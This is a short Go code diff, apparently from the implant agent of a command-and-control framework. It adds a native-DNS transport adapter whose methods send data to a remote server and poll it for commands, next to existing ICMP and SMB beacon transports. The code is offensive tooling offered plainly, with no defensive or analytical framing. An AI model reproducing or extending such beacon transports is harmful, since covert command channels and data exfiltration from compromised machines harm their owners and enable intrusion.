@@ -36,6 +36,16 @@ func newICMPTransport(serverIP, agentID string) (BeaconTransport, error) {
 	return &icmpAdapter{c: c}, nil
 }
 
+// dnsNativeAdapter wraps transport.DNSClient (native DNS, not DoH).
+type dnsNativeAdapter struct{ c *transport.DNSClient }
+
+func (d *dnsNativeAdapter) SendData(payload []byte) error { return d.c.SendData(payload) }
+func (d *dnsNativeAdapter) PollCommand() ([]byte, error)  { return d.c.PollCommand() }
+
+func newDNSNativeTransport(domain, agentID, server string) BeaconTransport {
+	return &dnsNativeAdapter{c: transport.NewDNSClient(domain, agentID, server)}
+}
+
 // smbAdapter wraps transport.SMBClient.
 type smbAdapter struct{ c *transport.SMBClient }
 
